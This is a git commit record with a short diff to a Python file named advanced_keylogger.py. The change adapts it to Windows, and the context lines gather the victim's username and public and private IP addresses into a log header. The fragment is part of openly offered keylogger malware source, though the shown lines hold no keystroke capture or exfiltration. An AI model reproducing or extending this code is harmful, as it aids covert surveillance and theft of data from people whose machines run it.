e7ac406398fd73070bbdb82543f5d511a93aafb3
kacperwalter <kacwal@poczta.fm>
2019-10-22 16:19:34 +0200

    modules installed and user variable prepared to work on windows

--- advanced_keylogger.py
+++ advanced_keylogger.py
@@ -13,7 +13,7 @@ import socket
 
 publicIP = requests.get('https://api.ipify.org').text
 privateIP = socket.gethostbyname(socket.gethostname())
-user = os.path.expanduser('~').split('/')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
+user = os.path.expanduser('~').split('\\')[2] # home directory splitting by '/' because i use unix system - for windows its "\\"
 datetime = time.ctime(time.time())
 
 msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
